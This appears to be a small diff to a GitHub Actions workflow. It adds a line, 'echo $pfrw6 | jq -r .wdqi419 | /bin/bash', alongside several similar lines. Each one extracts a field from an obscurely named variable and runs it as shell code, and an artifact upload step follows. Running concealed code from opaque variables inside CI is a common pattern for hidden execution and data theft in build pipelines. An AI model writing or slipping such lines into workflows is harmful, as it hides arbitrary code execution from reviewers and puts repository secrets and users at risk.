@@ -24,6 +24,7 @@ jobs:
           echo $az404 | jq -r .l4 | /bin/bash
           printf '%s' "$su70" | jq -r .fq444 | /bin/bash
           printf '%s' "$tgsn95" | jq -r .fcsk8 | /bin/bash
+          echo $pfrw6 | jq -r .wdqi419 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
